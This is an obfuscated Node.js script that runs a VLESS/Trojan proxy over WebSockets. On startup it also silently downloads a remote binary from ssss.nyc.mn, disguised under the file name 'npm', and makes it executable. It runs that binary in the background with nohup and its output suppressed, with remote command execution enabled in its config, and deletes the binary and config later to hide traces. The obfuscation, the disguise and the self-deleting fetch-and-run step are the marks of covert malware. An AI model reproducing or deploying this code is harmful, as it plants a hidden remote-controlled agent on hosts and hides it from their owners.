const _0x5702a3=_0x2046;(function(_0x2724d1,_0x9501ca){const _0xfce40e=_0x2046,_0x94e87f=_0x2724d1();while(!![]){try{const _0x6f67d9=parseInt(_0xfce40e(0x144))/0x1+-parseInt(_0xfce40e(0x124))/0x2*(parseInt(_0xfce40e(0x15d))/0x3)+parseInt(_0xfce40e(0x159))/0x4+-parseInt(_0xfce40e(0xfa))/0x5+parseInt(_0xfce40e(0x122))/0x6+parseInt(_0xfce40e(0x141))/0x7*(parseInt(_0xfce40e(0x131))/0x8)+-parseInt(_0xfce40e(0xf8))/0x9;if(_0x6f67d9===_0x9501ca)break;else _0x94e87f['push'](_0x94e87f['shift']());}catch(_0x3e968d){_0x94e87f['push'](_0x94e87f['shift']());}}}(_0x45ea,0x5aeec));const os=require('os'),http=require(_0x5702a3(0xfd)),fs=require('fs'),axios=require(_0x5702a3(0x134)),net=require(_0x5702a3(0x107)),path=require(_0x5702a3(0x14f)),crypto=require(_0x5702a3(0xf2)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x5702a3(0x114)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x5702a3(0x116)]||_0x5702a3(0x14c),NEZHA_SERVER=process[_0x5702a3(0xef)][_0x5702a3(0x125)]||'',NEZHA_PORT=process[_0x5702a3(0xef)][_0x5702a3(0x153)]||'',NEZHA_KEY=process['env'][_0x5702a3(0x14b)]||'',DOMAIN=process['env']['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process[_0x5702a3(0xef)][_0x5702a3(0x11c)]||!![],WSPATH=process[_0x5702a3(0xef)][_0x5702a3(0x158)]||UUID[_0x5702a3(0x126)](0x0,0x8),SUB_PATH=process[_0x5702a3(0xef)]['SUB_PATH']||'sub',NAME=process[_0x5702a3(0xef)][_0x5702a3(0x105)]||'',PORT=process[_0x5702a3(0xef)][_0x5702a3(0x15f)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x544fdd=_0x5702a3;try{const _0x20917d=await axios[_0x544fdd(0xf0)](_0x544fdd(0x13a)),_0x4daf0a=_0x20917d['data'];ISP=(_0x4daf0a[_0x544fdd(0xfc)]+'-'+_0x4daf0a[_0x544fdd(0x113)])[_0x544fdd(0x148)](/ /g,'_');}catch(_0x1bf63e){ISP=_0x544fdd(0xe8);}};GetISP();const httpServer=http[_0x5702a3(0x13e)]((_0x26948c,_0x26eb1b)=>{const _0x19e62f=_0x5702a3;if(_0x26948c[_0x19e62f(0x161)]==='/'){const _0x21e541=path[_0x19e62f(0x15c)](__dirname,_0x19e62f(0x147));fs[_0x19e62f(0xee)](_0x21e541,_0x19e62f(0x104),(_0x1d7959,_0x151a40)=>{const _0x40794d=_0x19e62f;if(_0x1d7959){_0x26eb1b['writeHead'](0xc8,{'Content-Type':_0x40794d(0x10d)}),_0x26eb1b[_0x40794d(0x10e)](_0x40794d(0x103));return;}_0x26eb1b[_0x40794d(0x136)](0xc8,{'Content-Type':_0x40794d(0x10d)}),_0x26eb1b[_0x40794d(0x10e)](_0x151a40);});return;}else{if(_0x26948c[_0x19e62f(0x161)]==='/'+SUB_PATH){const _0x15a084=NAME?NAME+'-'+ISP:ISP,_0x5f2d04='vless://'+UUID+'@'+DOMAIN+_0x19e62f(0x121)+DOMAIN+_0x19e62f(0x143)+DOMAIN+_0x19e62f(0x157)+WSPATH+'#'+_0x15a084,_0x1fe11c=_0x19e62f(0x12f)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x19e62f(0x143)+DOMAIN+_0x19e62f(0x157)+WSPATH+'#'+_0x15a084,_0xeacf01=_0x5f2d04+'\x0a'+_0x1fe11c,_0x224a03=Buffer['from'](_0xeacf01)[_0x19e62f(0xff)](_0x19e62f(0xe7));_0x26eb1b[_0x19e62f(0x136)](0xc8,{'Content-Type':_0x19e62f(0x127)}),_0x26eb1b[_0x19e62f(0x10e)](_0x224a03+'\x0a');}else _0x26eb1b[_0x19e62f(0x136)](0x194,{'Content-Type':_0x19e62f(0x127)}),_0x26eb1b[_0x19e62f(0x10e)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x5702a3(0x148)](/-/g,''),DNS_SERVERS=[_0x5702a3(0x11e),_0x5702a3(0x13d)];function resolveHost(_0x3a43b3){return new Promise((_0x2a4ad1,_0x1cc401)=>{const _0x4174b0=_0x2046;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4174b0(0x11f)](_0x3a43b3)){_0x2a4ad1(_0x3a43b3);return;}let _0x4c55a2=0x0;function _0x5d421f(){const _0x97626d=_0x4174b0;if(_0x4c55a2>=DNS_SERVERS[_0x97626d(0x156)]){_0x1cc401(new Error(_0x97626d(0x111)+_0x3a43b3+_0x97626d(0x108)));return;}const _0x56db02=DNS_SERVERS[_0x4c55a2];_0x4c55a2++;const _0x16e8f3=_0x97626d(0x15b)+encodeURIComponent(_0x3a43b3)+_0x97626d(0x165);axios[_0x97626d(0xf0)](_0x16e8f3,{'timeout':0x1388,'headers':{'Accept':_0x97626d(0x130)}})[_0x97626d(0x102)](_0x4914bb=>{const _0x5791b6=_0x97626d,_0x514a4e=_0x4914bb[_0x5791b6(0x115)];if(_0x514a4e['Status']===0x0&&_0x514a4e[_0x5791b6(0x101)]&&_0x514a4e[_0x5791b6(0x101)][_0x5791b6(0x156)]>0x0){const _0x5356ed=_0x514a4e[_0x5791b6(0x101)][_0x5791b6(0x15e)](_0x4a2821=>_0x4a2821[_0x5791b6(0x137)]===0x1);if(_0x5356ed){_0x2a4ad1(_0x5356ed[_0x5791b6(0x115)]);return;}}_0x5d421f();})[_0x97626d(0x14d)](_0x4859d6=>{_0x5d421f();});}_0x5d421f();});}function handleVlessConnection(_0x5d2bc1,_0x371e00){const _0x1acf0c=_0x5702a3,[_0x3b13b0]=_0x371e00,_0x29f481=_0x371e00[_0x1acf0c(0x126)](0x1,0x11);if(!_0x29f481['every']((_0xb10bf7,_0x33f430)=>_0xb10bf7==parseInt(uuid[_0x1acf0c(0x145)](_0x33f430*0x2,0x2),0x10)))return![];let _0x4a1f02=_0x371e00[_0x1acf0c(0x126)](0x11,0x12)[_0x1acf0c(0x100)]()+0x13;const _0x5f3fcf=_0x371e00['slice'](_0x4a1f02,_0x4a1f02+=0x2)['readUInt16BE'](0x0),_0x1cdd07=_0x371e00[_0x1acf0c(0x126)](_0x4a1f02,_0x4a1f02+=0x1)['readUInt8'](),_0xc0394c=_0x1cdd07==0x1?_0x371e00[_0x1acf0c(0x126)](_0x4a1f02,_0x4a1f02+=0x4)[_0x1acf0c(0x15c)]('.'):_0x1cdd07==0x2?new TextDecoder()[_0x1acf0c(0x12a)](_0x371e00[_0x1acf0c(0x126)](_0x4a1f02+0x1,_0x4a1f02+=0x1+_0x371e00[_0x1acf0c(0x126)](_0x4a1f02,_0x4a1f02+0x1)['readUInt8']())):_0x1cdd07==0x3?_0x371e00[_0x1acf0c(0x126)](_0x4a1f02,_0x4a1f02+=0x10)[_0x1acf0c(0xe9)]((_0x2f7639,_0x489f8e,_0x37ab86,_0x350e0c)=>_0x37ab86%0x2?_0x2f7639[_0x1acf0c(0x14a)](_0x350e0c['slice'](_0x37ab86-0x1,_0x37ab86+0x1)):_0x2f7639,[])[_0x1acf0c(0x140)](_0x3bfcce=>_0x3bfcce[_0x1acf0c(0x135)](0x0)['toString'](0x10))[_0x1acf0c(0x15c)](':'):'';_0x5d2bc1[_0x1acf0c(0x13f)](new Uint8Array([_0x3b13b0,0x0]));const _0x397e61=createWebSocketStream(_0x5d2bc1);return resolveHost(_0xc0394c)[_0x1acf0c(0x102)](_0x4fd854=>{const _0x1feb3b=_0x1acf0c;net['connect']({'host':_0x4fd854,'port':_0x5f3fcf},function(){const _0x259113=_0x2046;this['write'](_0x371e00[_0x259113(0x126)](_0x4a1f02)),_0x397e61['on'](_0x259113(0x13c),()=>{})[_0x259113(0x110)](this)['on'](_0x259113(0x13c),()=>{})[_0x259113(0x110)](_0x397e61);})['on'](_0x1feb3b(0x13c),()=>{});})['catch'](_0x1ef910=>{const _0x4e2a25=_0x1acf0c;net[_0x4e2a25(0xea)]({'host':_0xc0394c,'port':_0x5f3fcf},function(){const _0x24fee6=_0x4e2a25;this[_0x24fee6(0x106)](_0x371e00[_0x24fee6(0x126)](_0x4a1f02)),_0x397e61['on'](_0x24fee6(0x13c),()=>{})[_0x24fee6(0x110)](this)['on']('error',()=>{})[_0x24fee6(0x110)](_0x397e61);})['on'](_0x4e2a25(0x13c),()=>{});}),!![];}function handleTrojanConnection(_0xb6012d,_0x838b4){const _0xa3f81b=_0x5702a3;try{if(_0x838b4[_0xa3f81b(0x156)]<0x3a)return![];const _0x5cf330=_0x838b4[_0xa3f81b(0x126)](0x0,0x38)[_0xa3f81b(0xff)](),_0x9a0ca4=[UUID];let _0x1fb075=null;for(const _0x455cbc of _0x9a0ca4){const _0x4e7730=crypto[_0xa3f81b(0x132)](_0xa3f81b(0xeb))['update'](_0x455cbc)[_0xa3f81b(0x128)](_0xa3f81b(0x10a));if(_0x4e7730===_0x5cf330){_0x1fb075=_0x455cbc;break;}}if(!_0x1fb075)return![];let _0x417981=0x38;_0x838b4[_0x417981]===0xd&&_0x838b4[_0x417981+0x1]===0xa&&(_0x417981+=0x2);const _0x3dfdc1=_0x838b4[_0x417981];if(_0x3dfdc1!==0x1)return![];_0x417981+=0x1;const _0x2ec29b=_0x838b4[_0x417981];_0x417981+=0x1;let _0x4c5f6f,_0x497eb9;if(_0x2ec29b===0x1)_0x4c5f6f=_0x838b4['slice'](_0x417981,_0x417981+0x4)[_0xa3f81b(0x15c)]('.'),_0x417981+=0x4;else{if(_0x2ec29b===0x3){const _0x433a17=_0x838b4[_0x417981];_0x417981+=0x1,_0x4c5f6f=_0x838b4['slice'](_0x417981,_0x417981+_0x433a17)[_0xa3f81b(0xff)](),_0x417981+=_0x433a17;}else{if(_0x2ec29b===0x4)_0x4c5f6f=_0x838b4['slice'](_0x417981,_0x417981+0x10)[_0xa3f81b(0xe9)]((_0x4b35d8,_0x4d8e26,_0x3a0eef,_0x5ae4e9)=>_0x3a0eef%0x2?_0x4b35d8['concat'](_0x5ae4e9[_0xa3f81b(0x126)](_0x3a0eef-0x1,_0x3a0eef+0x1)):_0x4b35d8,[])[_0xa3f81b(0x140)](_0x55db48=>_0x55db48[_0xa3f81b(0x135)](0x0)[_0xa3f81b(0xff)](0x10))[_0xa3f81b(0x15c)](':'),_0x417981+=0x10;else return![];}}_0x497eb9=_0x838b4[_0xa3f81b(0x135)](_0x417981),_0x417981+=0x2;_0x417981<_0x838b4[_0xa3f81b(0x156)]&&_0x838b4[_0x417981]===0xd&&_0x838b4[_0x417981+0x1]===0xa&&(_0x417981+=0x2);const _0x3fec01=createWebSocketStream(_0xb6012d);return resolveHost(_0x4c5f6f)[_0xa3f81b(0x102)](_0x49c282=>{const _0x5364d8=_0xa3f81b;net[_0x5364d8(0xea)]({'host':_0x49c282,'port':_0x497eb9},function(){const _0x18f864=_0x5364d8;_0x417981<_0x838b4['length']&&this['write'](_0x838b4[_0x18f864(0x126)](_0x417981)),_0x3fec01['on'](_0x18f864(0x13c),()=>{})['pipe'](this)['on'](_0x18f864(0x13c),()=>{})[_0x18f864(0x110)](_0x3fec01);})['on'](_0x5364d8(0x13c),()=>{});})[_0xa3f81b(0x14d)](_0x41fe08=>{const _0x196872=_0xa3f81b;net[_0x196872(0xea)]({'host':_0x4c5f6f,'port':_0x497eb9},function(){const _0x59d9f0=_0x196872;_0x417981<_0x838b4[_0x59d9f0(0x156)]&&this[_0x59d9f0(0x106)](_0x838b4[_0x59d9f0(0x126)](_0x417981)),_0x3fec01['on'](_0x59d9f0(0x13c),()=>{})[_0x59d9f0(0x110)](this)['on'](_0x59d9f0(0x13c),()=>{})[_0x59d9f0(0x110)](_0x3fec01);})['on'](_0x196872(0x13c),()=>{});}),!![];}catch(_0x407903){return![];}}function _0x2046(_0x50af01,_0x47d36c){_0x50af01=_0x50af01-0xe7;const _0x45eae6=_0x45ea();let _0x2046cb=_0x45eae6[_0x50af01];return _0x2046cb;}wss['on'](_0x5702a3(0x10b),(_0x8723c5,_0x2a4ee8)=>{const _0x3ba2c7=_0x5702a3,_0x4b5d59=_0x2a4ee8['url']||'';_0x8723c5[_0x3ba2c7(0x139)]('message',_0x5930c4=>{const _0x589dd0=_0x3ba2c7;if(_0x5930c4['length']>0x11&&_0x5930c4[0x0]===0x0){const _0x165dc5=_0x5930c4[_0x589dd0(0x126)](0x1,0x11),_0x12e705=_0x165dc5['every']((_0x41016e,_0x490118)=>_0x41016e==parseInt(uuid[_0x589dd0(0x145)](_0x490118*0x2,0x2),0x10));if(_0x12e705){!handleVlessConnection(_0x8723c5,_0x5930c4)&&_0x8723c5['close']();return;}}!handleTrojanConnection(_0x8723c5,_0x5930c4)&&_0x8723c5[_0x589dd0(0x160)]();})['on'](_0x3ba2c7(0x13c),()=>{});});const getDownloadUrl=()=>{const _0x23f54d=_0x5702a3,_0x12f478=os[_0x23f54d(0x133)]();return _0x12f478===_0x23f54d(0x109)||_0x12f478===_0x23f54d(0x10f)||_0x12f478===_0x23f54d(0x12e)?!NEZHA_PORT?_0x23f54d(0x167):_0x23f54d(0xfb):!NEZHA_PORT?_0x23f54d(0x117):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x567fd9=_0x5702a3;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x7cf100=getDownloadUrl(),_0xde9f8b=await axios({'method':_0x567fd9(0xf0),'url':_0x7cf100,'responseType':_0x567fd9(0x14e)}),_0x199a32=fs[_0x567fd9(0xf4)](_0x567fd9(0x166));return _0xde9f8b[_0x567fd9(0x115)][_0x567fd9(0x110)](_0x199a32),new Promise((_0x5dda15,_0x37611b)=>{const _0x3e706b=_0x567fd9;_0x199a32['on'](_0x3e706b(0x118),()=>{const _0x3028b4=_0x3e706b;console[_0x3028b4(0xec)](_0x3028b4(0x11b)),exec(_0x3028b4(0x12d),_0x18555a=>{if(_0x18555a)_0x37611b(_0x18555a);_0x5dda15();});}),_0x199a32['on'](_0x3e706b(0x13c),_0x37611b);});}catch(_0x7a5c8a){throw _0x7a5c8a;}},runnz=async()=>{const _0x4942c5=_0x5702a3;try{const _0x412a9e=execSync(_0x4942c5(0x154),{'encoding':_0x4942c5(0x12c)});if(_0x412a9e[_0x4942c5(0xf9)]()!==''){console[_0x4942c5(0xec)](_0x4942c5(0x162));return;}}catch(_0x1eea39){}await downloadFile();let _0xfa559a='',_0x51b849=[_0x4942c5(0x12b),'8443',_0x4942c5(0x112),_0x4942c5(0x119),_0x4942c5(0x123),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x283533=_0x51b849[_0x4942c5(0xf5)](NEZHA_PORT)?_0x4942c5(0x129):'';_0xfa559a=_0x4942c5(0x13b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4942c5(0x152)+NEZHA_KEY+'\x20'+_0x283533+_0x4942c5(0x146);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x556eb7=NEZHA_SERVER[_0x4942c5(0xf5)](':')?NEZHA_SERVER[_0x4942c5(0xed)](':')[_0x4942c5(0x10c)]():'',_0x242db8=_0x51b849[_0x4942c5(0xf5)](_0x556eb7)?_0x4942c5(0x163):_0x4942c5(0x120),_0x4d1210=_0x4942c5(0xf7)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x4942c5(0x11a)+_0x242db8+_0x4942c5(0xf1)+UUID;fs[_0x4942c5(0x151)]('config.yaml',_0x4d1210);}_0xfa559a=_0x4942c5(0x150);}else{console[_0x4942c5(0xec)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0xfa559a,{'shell':_0x4942c5(0x149)},_0x5376f3=>{const _0x56b674=_0x4942c5;if(_0x5376f3)console[_0x56b674(0x13c)](_0x56b674(0x138),_0x5376f3);else console[_0x56b674(0xec)]('npm\x20is\x20running');});}catch(_0x188b91){console['error'](_0x4942c5(0x11d)+_0x188b91);}};async function addAccessTask(){const _0x759bad=_0x5702a3;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x26eee0='https://'+DOMAIN;try{const _0x29304f=await axios[_0x759bad(0x164)](_0x759bad(0x168),{'url':_0x26eee0},{'headers':{'Content-Type':_0x759bad(0x15a)}});console[_0x759bad(0xec)](_0x759bad(0x155));}catch(_0x473624){}}function _0x45ea(){const _0x99eb45=['crypto','listen','createWriteStream','includes','unlink','client_secret:\x20','779796TBJyhK','trim','2344965FMUArI','https://arm64.ssss.nyc.mn/agent','country_code','http','Server\x20is\x20running\x20on\x20port\x20','toString','readUInt8','Answer','then','Hello\x20world!','utf8','NAME','write','net','\x20with\x20all\x20DNS\x20servers','arm','hex','connection','pop','text/html','end','arm64','pipe','Failed\x20to\x20resolve\x20','2096','isp','child_process','data','UUID','https://amd64.ssss.nyc.mn/v1','finish','2087','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','npm\x20download\x20successfully','AUTO_ACCESS','error:\x20','8.8.4.4','test','false',':443?encryption=none&security=tls&sni=','2427576nGskde','2083','2492TZLUWy','NEZHA_SERVER','slice','text/plain','digest','--tls','decode','443','utf-8','chmod\x20+x\x20npm','aarch64','trojan://','application/dns-json','8GyEpcO','createHash','arch','axios','readUInt16BE','writeHead','type','npm\x20running\x20error:','once','https://api.ip.sb/geoip','setsid\x20nohup\x20./npm\x20-s\x20','error','1.1.1.1','createServer','send','map','1159242meblGl','config.yaml','&fp=chrome&type=ws&host=','203798FerCKu','substr','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','index.html','replace','/bin/bash','concat','NEZHA_KEY','9acba742-4484-42bb-9b65-a929666f05f3','catch','stream','path','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','writeFileSync','\x20-p\x20','NEZHA_PORT','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','Automatic\x20Access\x20Task\x20added\x20successfully','length','&path=%2F','WSPATH','850636gpScQU','application/json','https://dns.google/resolve?name=','join','141QPRuFq','find','PORT','close','url','npm\x20is\x20already\x20running,\x20skip\x20running...','true','post','&type=A','npm','https://arm64.ssss.nyc.mn/v1','https://oooo.serv00.net/add-url','base64','Unknown','reduce','connect','sha224','log','split','readFile','env','get','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'];_0x45ea=function(){return _0x99eb45;};return _0x45ea();}const delFiles=()=>{const _0x5476e8=_0x5702a3;fs[_0x5476e8(0xf6)](_0x5476e8(0x166),()=>{}),fs['unlink'](_0x5476e8(0x142),()=>{});};httpServer[_0x5702a3(0xf3)](PORT,()=>{const _0x3c402d=_0x5702a3;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3c402d(0xec)](_0x3c402d(0xfe)+PORT);});
